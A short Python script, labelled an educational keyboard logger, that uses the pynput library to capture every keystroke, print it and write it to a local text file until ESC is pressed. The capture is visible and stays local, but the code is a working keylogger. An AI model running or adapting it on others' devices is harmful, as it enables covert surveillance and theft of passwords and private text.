from pynput import keyboard # type: ignore

# File to store logged keys
log_file = "keylog_output.txt"

# Open the file in write mode
with open(log_file, "w") as file:

    def on_press(key):
        try:
            # Log the key pressed to file
            file.write(f"Key pressed: {key.char}\n")
            print(f"Key pressed: {key.char}")
        except AttributeError:
            file.write(f"Special key pressed: {key}\n")
            print(f"Special key pressed: {key}")

    def on_release(key):
        if key == keyboard.Key.esc:
            print("Exiting logger...")
            return False  # Stop listener

    print("=== Educational Keyboard Logger ===")
    print("Logging keys... Press ESC to stop.\n")

    # Start listening for key presses
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


